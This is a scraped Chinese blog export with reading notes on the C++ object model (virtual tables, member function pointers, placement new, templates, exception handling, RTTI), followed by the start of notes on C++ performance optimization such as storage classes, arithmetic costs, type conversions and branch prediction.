展现多态特性，我们需要额外的执行期信息。一如我所说，关键词class和struct并不能够帮助我们。由于没有导入像是polymorphic之类的新关键词，因此识别一个class是否支持多态，唯一适当的方法就是看看它是否有任何virtual function。只要class拥有一个virtual function，它就需要这份额外的执行期信息。 在实现上，首先我可以在每一个多态的class object身上增加两个members： 一个字符串或数字，表示class的类型； 一个指针，指向某表格，表格中持有程序的virtual functions的执行期地址。 然而，执行期备妥那些函数地址，只是解答的一半而已。另一半解答是找到那些地址。两个步骤可以完成这项任务： 为了找到表格，每一个class object被安插了一个由编译器内部产生的指针，指向该表格。 为了找到函数地址，每一个virtual function被指派一个表格索引值。 这些工作都由编译器完成。执行期要做的，只是在特定的virtual table slot（记录着virtual function的地址）中激活virtual function。 一个class只会有一个virtual table。每一个table内含其对应之class object中所有active virtual functions函数实例的地址。 现在，如果我有这样的式子：ptr-&gt;z() 我如何有足够的知识在编译时期设定virtual function的调用呢？ 一般而言，在每次调用 z()时，我并不知道ptr所指对象的真正类型。然而我知道，经由 ptr可以存取到该对象的virtual table。 虽然我不知道哪一个z()函数实例会被调用，但我知道每一个z()函数地址都被放在slot 4中。这些信息使得编译器可以将该调用转化为：(*ptr-&gt;vptr[4])(ptr) 多重继承下的Virtual Functions 在多重继承中支持virtual functions，其复杂度围绕在第二个及后继的base classes身上，以及“必须在执行期调整this指针”这一点。 虚拟继承下的Virtual Functions 右下角的vtbl有问题，指的应该是Point2d的函数地址。 4.3 函数的效能 nonmember、static member或nonstatic member函数都被转化为完全相同的形式。所以我们毫不惊讶地看到三者的效率完全相同。 4.4 指向Member Function的指针 取一个nonstatic data member的地址，得到的结果是该member在class布局中的bytes位置（再加1）。你可以想象它是一个不完整的值，它需要被绑定于某个class object的地址上，才能够被存取。取一个nonstatic member function的地址，如果该函数是nonvirtual，得到的结果是它在内存中真正的地址。然而这个值也是不完全的。它也需要被绑定于某个class object的地址上，才能够通过它调用该函数。所有的nonstatic member functions都需要对象的地址（以参数this指出）。 使用一个“member function指针”，如果并不用于virtual function、多重继承、virtual base class等情况的话，并不会比使用一个“nonmember function指针”的成本更高。 支持“指向 Virtual Member Functions”的指针 对一个nonstatic member function取其地址，将获得该函数在内存中的地址。然而面对一个virtual function，其地址在编译时期是未知的，所能知道的仅是virtual function在其相关之virtual table中的索引值。也就是说，对一个virtual member function取其地址，所能获得的只是一个索引值。 “指向 Member Functions之指针”的效率 一个“指向member function的指针”，是一个结构，内含三个字段：index、faddr和delta。index若不是内含一个相关virtual table的索引值，就是以-1表示函数是nonvirtual。faddr持有nonvirtual member function 的地址。delta持有一个可能的this指针调整值。 4.5 Inline Functions 一般而言，处理一个inline函数，有两个阶段： 分析函数定义，以决定函数的“intrinsic inline ability”（本质的 inline能力）。“intrinsic”（本质的、固有的）一词在这里意指“与编译器相关”。如果函数因其复杂度，或因其建构问题，被判断不可成为inline，它会被转为一个static函数，并在“被编译模块”内产生对应的函数定义。 真正的inline函数扩展操作是在调用的那一点上。这会带来参数的求值操作（evaluation）以及临时性对象的管理。 局部变量（Local Variables） 一般而言，inline函数中的每一个局部变量都必须被放在函数调用的一个封闭区段中，拥有一个独一无二的名称。如果inline函数以单一表达式（expression）扩展多次，则每次扩展都需要自己的一组局部变量。如果inline函数以分离的多个式子（discrete statements）被扩展多次，那么只需一组局部变量，就可以重复使用（译注：因为它们被放在一个封闭区段中，有自己的scope）。 然而一个inline函数如果被调用太多次的话，会产生大量的扩展码，使程序大小暴涨。 五、构造、析构、拷贝语意学 一般而言，class的data member应该被初始化，并且只在constructor中或是在class的其他member functions中指定初值。其他任何操作都将破坏封装性质，使class的维护和修改更加困难。 5.1 “无继承”情况下的对象构造 可以定义和调用（invoke）一个pure virtual function；不过它只能被静态地调用（invoked statically），不能经由虚拟机制调用。 唯一的例外就是pure virtual destructor：class设计者一定得定义它。为什么？因为每一个derived class destructor会被编译器加以扩张，以静态调用的方式调用其“每一个virtual base class”以及“上一层base class”的destructor。因此，只要缺乏任何一个base class destructors的定义，就会导致链接失败。 这样的设计是以C++语言的一个保证为前提：继承体系中每一个class object的destructors都会被调用。所以编译器不能够压抑这一调用操作。一个比较好的替代方案就是，不要把virtual destructor声明为pure。 5.2 继承体系下的对象构造 constructor的执行算法通常如下： 在derived class constructor中，“所有virtual base classes”及“上一层base class”的 constructors会被调用。 上述完成之后，对象的vptr(s)被初始化，指向相关的virtual table(s)。 如果有member initialization list的话，将在constructor体内扩展开来。这必须在vptr被设定之后才做，以免有一个virtual member function被调用。 最后，执行程序员所提供的代码。 5.3 对象复制语意学（Object Copy Semantics） 尽可能不要允许一个virtual base class的拷贝操作。我甚至提供一个比较奇怪的建议：不要在任何virtual base class中声明数据。 5.4 析构语意学（Semantics of Destruction） 如果class没有定义destructor，那么只有在class内含的member object （或class自己的base class）拥有destructor的情况下，编译器才会自动合成出一个来。否则，destructor被视为不需要，也就不需被合成（当然更不需要被调用）。 小结 即使是一个抽象基类，如果它有非静态数据成员，也应该给它提供一个带参数的构造函数，来初始化它的数据成员。类的data member应当被初始化，且只在其构造函数或其member function中初始化。 不要将析构函数设计为纯虚的，这不是一个好的设计。将析构函数设计为纯虚函数意味着，即使纯虚函数在语法上允许我们只声明而不定义纯虚函数，但还是必须实现该纯虚析构函数，否则它所有的继承类都将遇到链接错误。 真的必要的时候才使用虚函数，不要滥用虚函数。虚函数意味着不小的成本，编译很可能给你的类带来膨胀效应。 不能决定一个虚函数是否需要 const ，那么就不要它。 决不在构造函数或析构函数中使用虚函数机制。在构造函数中，每次调用虚函数会被决议为当前构造函数所对应类的虚函数实体，虚函数机制并不起作用。 六、执行期语意学（Runtime Semantics） C++的一件困难事情：不太容易从程序源码看出表达式的复杂度。 一般而言我们会把object尽可能放置在使用它的那个程序区段附近，这么做可以节省非必要的对象产生操作和摧毁操作。 6.1 对象的构造和析构 全局对象（Global Objects） 由于这样的限制，下面这些munch策略就浮现出来了： 为每一个需要静态初始化的文件产生一个_sti()函数，内含必要的constructor调用操作或inline expansions。 在每一个需要静态的内存释放操作（static deallocation）的文件中，产生一个__std()函数（译注：我想std就是static deallocation的缩写），内含必要的destructor调用操作，或是其 inline expansions。 提供一组runtime library“munch”函数：一个_main()函数（用以调用可执行文件中的所有__sti()函数），以及一个exit()函数（以类似方式调用所有的__std()函数）。 Lippman建议：根本就不要使用那些需要静态初始化的全局对象。真的非要一个全局对象，而且这个对象还需要静态初始化？用一个函数封装一个静态局部对象，也是一样的效果。 6.2 new和delete运算符 运算符new expression运算的使用，看起来似乎是个单一运算。int *p=new int (5)实际上包含着两个步骤： 调用一个合适的operator new实体分配足够的未类型化的内存。 调用合适的构造函数初始化这块内存，当然int没有构造函数，但是会进行赋值操作：*p=5。 delete寻找数组维度，对于delete运算符的效率带来极大的冲击，所以才导致这样的妥协：只有在中括号出现时，编译器才寻找数组的维度，否则它便假设只有单独一个objects要被删除。如果程序员没有提供必须的中括号，那么就只有第一个元素会被析构。其他的元素仍然存在——虽然其相关的内存已经被要求归还了。 new expression和operator new new expression和operator new完全不是一回事，但关系不浅——operator new 为new expression分配内存。且不能重定义new或delete expression的行为。 operator new其实也是可以直接利用的，譬如当我们只想分配内存，而不愿意进行初始化的时候，我们就可以直接用operator new 来进行。用法如下： 1T* newelements = static_cast&lt;T*&gt;(operator new ( sizeof(T) ); 标准库重载有两个版本的operator new，分别为单个对象和数组对象服务，单个对象版本的提供给分配单个对象new expression调用，数组版的提供给分配数组的 new expression 调用： 12void *operator new(size_t); // allocate an objectvoid *operator new[](size_t); // allocate an array 我们可以分别重载这两个版本，来定义我们自己的分配单个对象或对象数组的内存方式。当我们自己在重载operator new时，不一定要完全按照上面两个版本的原型重载，唯一的两个要求是：返回一个void*类型和第一个参数的类型必须为size_t。 在类中重载的operator new和operator delete是隐式静态的，因为前者运行于对象构造之前，后者运行于对象析构之后，所以他们不能也不应该拥有一个this指针来存取数据。 placement operator new placement operator new用来在指定地址上构造对象，要注意的是，它并不分配内存，仅仅是对指定地址调用构造函数。 point *pt = new(p) point3d; 它是operator new的一个重载版本。它的实现方式异常简单，传回一个指针即可： 123void* operator new(site_t,void *p)&#123; return p;&#125; 看一份代码： 12345678910111213141516struct Base &#123; int j; virtual void f(); &#125;;struct Derived : Base &#123; void f(); &#125;;void fooBar() &#123; Base b; b.f(); // Base::f() invoked b.~Base(); //析构掉了，但是内存并未释放掉 new (&amp;b) Derived; b.f(); // which f() invoked? &#125; 上述两个类的大小相同，因此将Derived对象放在 Base对象中是安全的，但是在最后一句代码中 b.f()调用的是哪一个类的f()。答案是Base::f() 的。 虽然此时b中存储的实际上是一个Derived对象，但是，通过一个对象来调用虚函数，将被静态决议出来，虚函数机制不会被启用。 6.3 临时性对象（Temporary Objects） 何时生成临时对象 程序片段： 12T a, b;T c = a + b; 编译器更愿意直接调用拷贝构造函数的方式将a+b的值放到c中，这样就不需要临时对象，和它的构造函数和拷贝构造函数的调用了。如果operator +的定义符合NRV优化的条件，那么NRV优化的开启，将使得拷贝构造函数的调用和named object的析构函数都免了。 所以比先声明 c 对象，再进行c = a + b要高效。 临时对象的生命周期 临时性对象在完整表达式尚未评估完全之前，不得被摧毁。临时性对象的摧毁应当作为造成产生这个临时对象的完整表达式的最后一个步骤。 对于下面的程序： 12string s1(\"hello \"), s2(\"world \"), s3(\"by Adoo\");std::cout &lt;&lt; s1 + s2 + s3 &lt;&lt; std::endl; 显然保存s1+s2结果的临时对象，如果在与s3进行加法之前析构，将会带来大麻烦。 七、站在对象模型的尖端 C++语言三个著名的扩充性质，它们都会影响C++对象。它们分别是template、exception handling（EH）和runtime type identification（RTTI）。 7.1 Template 有关template的三个主要讨论方向： template的声明。基本来说就是当你声明一个template class、template class member function等等时，会发生什么事情。 如何“实例化（instantiates）”class object、inline nonmember以及 member template functions。这些是“每一个编译单位都会拥有一份实例”的东西。 如何“实例化（instantiates）”nonmember、member template functions以及static template class members。这些都是“每一个可执行文件中只需要一份实例”的东西。这也就是一般而言 template所带来的问题。 Template的“实例化”行为（Template Instantiation） 一个模板只有被使用到，才会被实例化，否则不会被实例化。对于一个实例化后的模板来说，未被调用的成员函数将不会被实例化，只有成员函数被使用时，C++标准才要求实例化他们。其原因，有两点： 空间和时间效率的考虑，如果模板类中有100个成员函数，对某个特定类型只有2个函数会被使用，针对另一个特定类型只会使用3个，那么如果将剩余的195个函数实例化将浪费大量的时间和空间。 使模板有最大的适用性。并不是实例化出来的每个类型都支持所有模板的全部成员函数所需要的运算符。如果只实例化那些真正被使用的成员函数的话，那么原本在编译期有错误的类型也能够得到支持。 可以明确的要求在一个文件中将整个类模板实例化： 1template class Point3d&lt;float&gt;; 也可以显示指定实例化一个模板类的成员函数： 1template float Point3d&lt;float&gt;::X() const; 或是针对一个模板函数： 12template Point3d&lt;float&gt; operator+( const Point3d&lt;float&gt;&amp;, const Point3d&lt;float&gt;&amp; ); Template的错误报告（Error Reporting within a Template） 所以在一个parsing策略之下，所有语汇（lexing）错误和解析（parsing）错误都会在处理template声明的过程中被标示出来。所有与类型有关的检验，如果牵涉到template参数，都必须延迟到真正的实例化操作（instantiation）发生，才得为之。 目前的编译器，面对一个template声明，在它被一组实际参数实例化之前，只能施行以有限的错误检查。template中那些与语法无关的错误，程序员可能认为十分明显，编译器却让它通过了，只有在特定实例被定义之后，才会发出抱怨。这是目前实现技术上的一个大问题。 模板的错误报告，使用模板并遇到错误的大概都深有体会，那就是一个灾难。 Template中的名称决议（Name Resolution within a Template） Template之中，对于一个nonmember name 的决议结果，是根据这个name的使用是否与“用以实例化该template的参数类型”有关而决定的。如果其使用互不相关，那么就以“scope of the template declaration”来决定name。如果其使用互有关联，那么就以“scope of the tem plate instantiation”来决定name。 这意味着一个编译器必须保持两个scope contexts： “scope of the template declaration”，用以专注于一般的template class。 “scope of the template instantiation”，用以专注于特定的实例。 编译器的决议（resolution）算法必须决定哪一个才是适当的scope，然后在其中搜寻适当的name。 第一种情况： 12345678910111213141516171819// scope of the template declarationextern double foo ( double ); template &lt; class type &gt; class ScopeRules &#123; public: void invariant() &#123; _member = foo( _val ); &#125; type type_dependent() &#123; return foo( _member ); &#125; // ... private: int _val; type _member; &#125;; 第二种情况: 1234567//scope of the template instantiation extern int foo( int ); // ... ScopeRules&lt; int &gt; sr0; sr0.invariant();sr0.type_dependent(); 在“scope of the template instantiation ”中两个foo()都声明在此 scope中。sr0.invariant() 中调用的是： 1extern double foo ( double ); 看上去，应该调用： 1extern int foo( int ); 毕竟，_val 的类型是 int 类型，它们才完全匹配。 而 sr0.type_dependent() 中调用的却在我们意料之中，调用的是: 1extern int foo( int ); 诸上所述，看上去或合理或不合理的选择，原因在于: template 之中， 对于一个非成员名字的决议结果是根据这个 name 的使用是否与“用以实例化该模板的参数类型”有关来决定name。如果其使用互不相干，那么就以“scope of the template declaration”来决定name。如果其使用的互相关联，那么就以“scope of the template instantiation”来决定name。 Member Function的实例化行为（Member Function Instantiation） 对于 template 的支持，最困难的莫过于template function的实例化（instantiation）。目前的编译器提供了两个策略：一个是编译时期策略，程序代码必须在program text file中备妥可用；另一个是链接时期策略，有一些meta-compilation工具可以导引编译器的实例化行为（instantiation）。 7.2 异常处理（Exception Handling） 欲支持exception handling，编译器的主要工作就是找出catch子句，以处理被抛出来的 exception。这多少需要追踪程序堆栈中的每一个函数的目前作用区域（包括追踪函数中local class objects当时的情况）。同时，编译器必须提供某种查询exception objects 的方法，以知道其实际类型（这直接导致某种形式的执行期类型识别，也就是 RTTI）。最后，还需要某种机制用以管理被抛出的object，包括它的产生、存储、可能的析构（如果有相关的destructor）、清理（clean up）以及一般存取。也可能有一个以上的objects同时起作用。一般而言，exception handling机制需要与编译器所产生的数据结构以及执行期的一个exception library紧密合作。 在程序大小和执行速度之间，编译器必须有所抉择： 为了维护执行速度，编译器可以在编译时期建立起用于支持的数据结构。这会使程序的大小发生膨胀，但编译器可以几乎忽略这些结构，直到有个exception被抛出来。 为了维护程序大小，编译器可以在执行期建立起用于支持的数据结构。这会影响程序的执行速度，但意味着编译器只有在必要的时候才建立那些数据结构（并且可以抛弃之）。 Exception Handling 快速检阅C++的exception handling由三个主要的语汇组件构成： 一个throw子句。它在程序某处发出一个exception。被抛出去的exception可以是内建类型，也可以是使用者自定类型。 一个或多个catch子句。每一个catch子句都是一个exception handler。它用来表示说，这个子句准备处理某种类型的exception，并且在封闭的大括号区段中提供实际的处理程序 一个try区段。它被围绕以一系列的叙述句（statements），这些叙述句可能会引发catch子句起作用。 当一个exception被抛出去时，控制权会从函数调用中被释放出来，并寻找一个吻合的catch子句。如果都没有吻合者，那么默认的处理例程terminate()会被调用。当控制权被放弃后，堆栈中的每一个函数调用也就被推离（popped up）。这个程序称为unwinding the stack。在每一个函数被推离堆栈之前，函数的local class objects的destructor会被调用。 支持EH，会使那些拥有member class subobjects或base class subobjects（并且它们也都有constructors）的classes的constructor更复杂。一个class如果被部分构造，其destructor必须只施行于那些已被构造的subobjects和（或）member objects身上。 对Exception Handling的支持 当一个exception发生时，编译系统必须完成以下事情： 检验发生throw操作的函数。 决定throw操作是否发生在try区段中。 若是，编译系统必须把exception type拿来和每一个catch子句进行比较。 如果比较后吻合，流程控制应该交到catch子句手中。 如果throw的发生并不在 try区段中，或没有一个catch子句吻合，那么系统必须（a）摧毁所有active local objects，（b）从堆栈中将目前的函数“unwind”掉，（c）进行到程序堆栈的下一个函数中去，然后重复上述步骤 2～5。 决定throw是否发生在一个try区段中 还记得吗，一个函数可以被想象为好几个区域： try区段以外的区域，而且没有active local objects。 try区段以外的区域，但有一个（或以上）的active local objects需要析构。 try区段以内的区域。 编译器必须标示出以上各区域，并使它们对执行期的exception handling系统有所作用。一个很棒的策略就是构造出program counter-range表格。 回忆一下，program counter内含下一个即将执行的程序指令。好，为了在一个内含try区段的函数中标示出某个区域，可以把program counter的起始值和结束值（或是起始值和范围）存储在一个表格中。 当throw操作发生时，目前的program counter值被拿来与对应的“范围表格”进行比对，以决定目前作用中的区域是否在一个try区段中。如果是，就需要找出相关的catch子句。如果这个exception无法被处理（或者它被再次抛出），目前的这个函数会从程序堆栈中被推出（popped），而program counter会被设定为调用端地址，然后这样的循环再重新开始。 将exception的类型和每一个catch子句的类型做比较 对于每一个被抛出来的exception，编译器必须产生一个类型描述器，对exception的类型进行编码。如果那是一个derived type，编码内容必须包括其所有base class的类型信息。只编进public base class的类型是不够的，因为这个exception可能被一个member function捕捉，而在一个member function的范围（scope）之中，derived class和nonpublic base class之间可以转换。 类型描述器（type descriptor）是必要的，因为真正的exception是在执行期被处理的，其object必须有自己的类型信息。RTTI正是因为支持EH而获得的副产品。 编译器还必须为每一个catch子句产生一个类型描述器。执行期的exception handler会将“被抛出之object的类型描述器”和“每一个catch子句的类型描述器”进行比较，直到找到吻合的一个，或是直到堆栈已经被 “unwind” 而 terminate()已被调用。 每一个函数会产生出一个exception表格，它描述与函数相关的各区域、任何必要的善后处理代码（cleanup code，被local class object destructors调用）以及catch子句的位置（如果某个区域是在try区段之中的话）。 当一个实际对象在程序执行时被抛出，会发生什么事？ 当一个exception被抛出时，exception object会被产生出来并通常放置在相同形式的exception数据堆栈中。从throw端传给catch子句的，是exception object的地址、类型描述器（或是一个函数指针，该函数会传回与该exception type有关的类型描述器对象）以及可能会有的 exception object 描述器（如果有人定义它的话）。 异常与内存 异常抛出有可能带来一些问题，比方在一块内存的lock和unlock内存之间，或是在new和delete之间的代码抛出了异常，那么将导致本该进行的unlock或delete操作不能进行。 在函数被出栈之前，先截住异常，在unlock和delete之后再将异常原样抛出。new expression的调用不用包括在try块之内是因为，不论在new operator调用时还是构造函数调用时抛出异常，都会在抛出异常之前释放已分配好的资源，所以不用再调用delete 。 另一个办法是，将这些资源管理的问题，封装在一个类对象中，由析构函数释放资源，这样就不需要对代码进行上面那样的处理——利用函数释放控制权之前会析构所有局部对象的原理。 同样的道理，适用于数组身上，如果在调用构造函数过程中抛出异常，那么之前所有被构造好的元素的析构函数被调用，对于抛出异常的该元素，则遵循关于单个对象构造的原则，然后释放已经分配好的内存。 12345678910111213141516void mumble( void *arena ) &#123; Point *p; p = new Point; try &#123; smLock( arena ); // ... &#125; catch ( ... ) &#123; smUnLock( arena ); delete p; throw; &#125; smUnLock( arena ); delete p; &#125; 7.3 执行期类型识别（Runtime Type Identification，RTTI） Type-Safe Downcast（保证安全的向下转换操作） 一个type-safe downcast必须在执行期对指针有所查询，看看它是否指向它所展现（表达）之object的真正类型。因此，欲支持type-safe downcast，在object空间和执行时间上都需要一些额外负担： 需要额外的空间以存储类型信息（type information），通常是一个指针，指向某个类型信息节点。 需要额外的时间以决定执行期的类型（runtime type），因为，正如其名所示，这需要在执行期才能决定。 C++的RTTI机制提供了一个安全的downcast设备，但只对那些展现“多态（也就是使用继承和动态绑定）”的类型有效。 在C++中，一个具备多态性质的class（所谓的polymorphic class），正是内含着继承而来（或直接声明）的virtual functions。 从编译器的角度来看，这个策略还有其他优点，就是大量降低额外负担。所有polymorphic classes的objects都维护了一个指针（vptr），指向virtual function table。只要我们把与该class相关的RTTI object 地址放进virtual table 中（通常放在第一个slot），那么额外负担就降低为：每一个class object只多花费一个指针。这一指针只需被设定一次，它是被编译器静态设定的，而非在执行期由 class constructor设定。 Type-Safe Dynamic Cast（保证安全的动态转换） dynamic_cast运算符可以在执行期决定真正的类型。如果downcast是安全的（也就是说，如果base type pointer指向一个derived class object），这个运算符会传回被适当转换过的指针。如果downcast不是安全的，这个运算符会传回0。 什么是dynamic_cast的真正成本呢？pfct的一个类型描述器会被编译器产生出来。由pt所指向的class object类型描述器必须在执行期通过vptr取得。type_info是C++Standard所定义的类型描述器的class名称，该class中放置着待索求的类型信息。virtual table的第一个slot内含type_info object 的地址；此type_info object与pt所指的class type有关。这两个类型描述器被交给一个runtime library函数，比较之后告诉我们是否吻合。 References不同于Pointers 程序执行中对一个class指针类型施以dynamic_cast 运算符： 如果传回真正的地址，则表示这一object的动态类型被确认了，一些与类型有关的操作现在可以施行于其上。 如果传回0，则表示没有指向任何object，意味着应该以另一种逻辑施行于这个动态类型未确定的object身上。 因此当dynamic_cast运算符施行于一个reference 时，会发生下列事情： 如果reference真正cast到适当的derived class，downcast会被执行而程序可以继续进行。 如果reference并不真正是某一种derived class，那么，由于不能够传回0，因此抛出一个 bad_cast exception。 原因在于指针可以被赋值为0，以表示 no object，但是引用不行。 Typeid运算符 使用 typeid 运算符，就有可能以一个reference达到相同的执行期替代路线（runtime“alternative pathway”）。typeid运算符传回一个const reference，类型为type_info。如果两个type_info objects相等，这个equality运算符就传回true。 typeid 可以返回const type_info&amp;，用以获取类型信息。 虽然RTTI只支持多态类，但typeid和type_info同样可用于内建类型及所有非多态类。与多态类的差别在于，非多态类的type_info对象是静态取得，而多态类的是在执行期获得。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"}],"author":"HeRui"},{"title":"optimizing software in cpp","slug":"optimizing-software-in-cpp","date":"2022-06-21T13:14:38.000Z","updated":"2024-01-09T10:23:26.744Z","comments":true,"path":"posts/2ebe459a.html","link":"","permalink":"https://racleray.github.io/posts/2ebe459a.html","excerpt":"optimizing software in cpp 读书笔记","text":"Optimizing in C++ 1 不同的变量存储位置 stack 函数中的临时变量或对象一般存储在内存空间中的stack区。每当调用函数时，参数和临时变量进栈，当函数返回时，参数和临时变量出栈。栈是内存空间中最高效的存储方式。当临时变量中没有较大对象时，访问栈上的临时变量也基本能用上L1 data cache。 global or static 在函数体之外声明的变量称之为global变量，可被任何函数访问。被static修饰的变量称为static变量。 global和static变量在程序运行期间会被放置于内存空间中的静态数据区。 静态数据区域分为三个部分： 一部分存储 const 类型的 global/static 变量 一部分存储已被初始化的 global/static 变量， 最后一部分存储未被初始化的 global/static 变量。 使用静态数据区的好处是，global/static 变量在程序启动前就有专门的存储位置，坏处是在程序的生命周期内，这些存储位置将被一直占据，可能会降低 data cache 的效率。 所以建议尽量不要使用global变量。 register register变量存储在CPU寄存器中，函数中的临时变量特别适合放到register中。优点很明显，访问 register 变量比访问RAM快得多。但是CPU寄存器大小是非常有限的，在64位x86架构中，有14个整数寄存器，16个浮点寄存器。 volatile volatile 用于声明一个变量可被其他线程改变，阻止编译器依赖变量先前缓存的值来进行优化 。 123456789volatile int seconds; // incremented every second by another threadvoid DelayFiveSeconds()&#123; seconds = 0; while (seconds &lt; 5) &#123; // do nothing while seconds count to 5 &#125;&#125; 上面的代码如果不声明为 volatile, 编译器将任务while条件一直成立，即使别的线程中改变了seconds的值。 thread-local 大多数编译器可以使用关键字 __thread 或 __declspec(thread) 来实现静态变量和全局变量的线程本地存储。这样的变量在每个线程都有一个实例 。 线程本地存储是低效的，因为它是通过存储在线程访问块中的指针进行访问的。因此建议尽量避免线程本地存储，代之以stack存储。 dynamic memory allocation c++中通过new/malloc动态分配存储，通过delete/free释放动态分配的的存储，动态分配的存储放在内存空间的heap区中。 优点：使用相对stack存储更加灵活 缺点：动态分配和释放很耗时，容易出现野指针、悬垂指针、内存泄露、内存碎片等问题。 variables declared inside a class 类中声明的变量按照在类中的顺序存储，存储位置由类的对象在哪里定义的决定。static修饰的类成员变量将存储在静态数据区，只有一个实例。 将变量存储在类中的好处是保证了空间局部性，对CPU data cache更友好。 2 整型变量和运算符 整数大小 对于不同的平台，不同整数类型(char/short/int/long)的大小可能不同。 无论大小如何，整数运算基本都很快，除非使用了大于CPU寄存器大小的类型，比如在32位系统中使用64位整数。 建议在与大小无关且没有溢出风险的情况下使用默认整数大小，例如简单变量、循环计数器等。 在大型数组中，为了更好地使用数据缓存，最好使用足够大的最小整数大小。 无符号整形数 vs. 有符号整形数 在大多数情况下，使用有符号整数和无符号整数在速度上没有区别。 除了 除以常数：当你将一个整数除以一个常数时，无符号要快于有符号 对于大多数指令集，有符号整数比无符号整数转换成浮点数要快 有符号变量和无符号变量的溢出行为不同。 整数运算符 整数运算非常快。加减和位操作只需一个时钟周期，乘法需要3-4个时钟周期，除法需要40-80个。 自增和自减运算符 当仅用于递增整数变量时，使用递增前或递增后都没有区别。 例如，for (i=0; i&lt;n; i++)和for (i=0; i&lt;n; ++i)是一样的。 但是当使用表达式的结果时，效率可能会有所不同。 例如，x = array[i++] 比 x = array[++i] 速度更快。因为在后一种情况下，数组元素的地址的计算必须等待 i 的新值，这将使 x 的可用性延迟大约两个时钟周期。BUT，两者表达的意思是完全不同的。 3 浮点计算和运算符 x86架构中有两种浮点计算方法。 原始方法：使用8个浮点寄存器组成寄存器栈(长双精度80位)。 优点：精度高，不同精度之间无需额外转换，有浮点计算指令可用； 缺点：难以生成寄存器变量，浮点计算较慢，整数和浮点数之间转换效率很低 向量方法：使用8个或16个向量寄存器(XMM或YMM)。 优点：可并行计算，寄存器变量容易实现； 缺点：不支持长双精度，数学函数必须使用函数库(但通常比硬件指令更快) XMM向量寄存器在x86_64架构中可用。如果处理器和操作系统支持AVX指令集，则可使用YMM向量寄存器。当XMM可用时，编译器一般用向量方法计算浮点数。 根据微处理器的不同，浮点加法需要 3‐6 个时钟周期。乘法需要 4‐8 个时钟周期。除法需要 14‐45 个时钟周期。 4 枚举 枚举只是隐藏的整数。 5 布尔值 布尔操作数的顺序 短路逻辑：当 &amp;&amp; 的左操作数为false时，便不会计算右操作数。同理, || 的做操作数为true时，也不会计算右操作数。因此建议将通常为true的操作数放在&amp;&amp;表达式最后，或||表达式的开头。 布尔变量被过度检查 由于所有以布尔变量作为输入的运算符都要检查输入是否有除0或1之外的值，因此布尔变量会被过度检查。如果知道操作数除了 0 就是 1，布尔运算可以变得有效率的多。 编译器之所以不这样假设，是因为变量可能是没有被初始化的或者是来自其它未知来源的。 布尔向量操作 一个整数可被当做布尔向量操作。例如 bitmap 6 指针和引用 指针 vs. 引用 指针和引用的效率是一样的，因为它们实际上做的事情是相同的，区别在于编程风格。 指针的优点：功能上更灵活，可以做指针计算(例如访问缓冲区)，当然也更容易出错 引用的优点：语法更简单，也更安全。 效率 运行时，需要一个额外的寄存器来保存指针或引用的值，而寄存器是一种稀缺资源，如果没有足够的寄存器，那么指针每次使用时都必须从内存中加载，这会使程序变慢。 另一个缺点是指针的值需要几个时钟周期才能访问所指向的变量。也就是说，要读取指针或引用的值，最坏情况下需要访问两次内存。 函数指针 通过函数指针调用函数通常要比直接调用函数多花几个时钟周期 。 智能指针 使用智能指针的目的是为了确保对象被正确删除，以及在对象不再使用时释放内存 。 通过智能指针访问对象没有额外的成本。 但是，每当创建、删除、复制或从一个函数转移到另一个函数时，都会产生额外的成本。shared_ptr 的这些成本要高于 unique_ptr。 7 数组 数组是通过在内存中连续存储元素来实现的，没有存储关于数组大小的信息。因此c/c++中数组相比其他语言更快，但也更不安全。 当不按顺序索引时，为了使地址的计算更高效，那么除了第一个维度外，所有维度的大小最好是 2 的幂。当以非顺序访问元素，则对象的大小（以字节为单位）最好为 2 的幂。 上述建议是为了更好利用CPU的data cache。 8 类型转换 signed/unsigned转换 寄存器值不变，只是编译器换了解释方法。因此没有额外的性能成本。 整形类型大小的转换 类型大小转换通常不需要额外的时间 浮点进度转换 当使用浮点寄存器时，浮点、双精度和长双精度之间的转换不需要额外的时间 当用XMM寄存器时，需要 2 到 15个时钟周期（取决于处理器） 因此建议使用向量化寄存器存储浮点数时，不要混用浮点类型。 整形转浮点型 将有符号整数转换为浮点数或双精度浮点数需要 4‐16个时钟周期，这取决于处理器和使用的寄存器类型。无符号整数的转换需要更长的时间。 如果没有溢出的风险，首先将无符号整数转换为有符号整数会更快。 浮点型转化为整形 如果不启用 SSE2 或者更新的指令集，浮点数到整数的转换将花费很长的时间。通常，转换需要 50‐100 个时钟周期。 解决方案是： 使用 64 位模式或启用 SSE2 指令集； 使用四舍五入代替截断，并用汇编语言制作一个舍入函数。 指针类型转换 指针可以转换为另一种类型的指针。同样，可以将指针转换为整数，也可以将整数转换为指针。值还是那些值，只是换了种解释方法，因此没有任何开销。 重新解释对象 c++中的reinterpret_cast，没有任何额外开销。 const_cast const_cast 运算符用于解除 const 对指针的限制 。 没有任何额外开销。 static_cast static_cast 运算符的作用与 C 风格的类型转换相同。例如，它用于将 float 转换为 int reinterpret_cast 没有任何额外开销。 dynamic_cast dynamic_cast 运算符用于将指向一个类的指针转换为指向另一个类的指针。它在运行时检查转换是否有效 。dynamic_cast比static_cast更耗时，也更安全。 转换类对象 只有当程序员定义了构造函数、重载赋值运算符或重载类型转换运算符（指定如何进行转换）时，才有可能进行涉及类对象（而不是指向对象的指针）的转换。 构造函数或重载运算符与成员函数的效率是一样的。 9 分支和switch语句 在微处理器做出正确分支预测的情况下，执行分支指令通常需要 0‐2 个时钟周期。根据处理器的不同，从分支错误预测中恢复所需的时间大约为 12‐25 个时钟周期。这被称为分支预测错误的惩罚。 for 循环或 while 循环也是一种分支。 在每次迭代之后，它决定是重复还是退出循环。嵌套循环只能在某些处理器上得到很好的预测。在许多处理器上，包含多个分支的循环并不能很好地被预测。 switch 语句也是一种分支，它可以有两个以上的分支。 如果 case 标签是遵循每个标签等于前一个标签加 1 的序列，在这个时候 switch语句的效率是最高的，因为它可以被实现为一个目标跳转表。 如果 switch 带有许多标签值，并且彼此相差较大，这将是低效的，因为编译器必须将其转换成一个分支树。 分支和 switch 语句的数量，在程序的关键部分，最好控制在较少的水平 。 因为分支和函数调用的目标保存在称为分支目标缓冲区的特殊缓存中。如果一个程序中有许多分支或函数调用，那么在分支目标缓冲区中就可能产生竞争。这种竞争的结果是，即使分支具有良好的可预测性，它们也可能被错误地预测。 10 循环 循环的效率取决于微处理器对循环控制分支的预测能力。 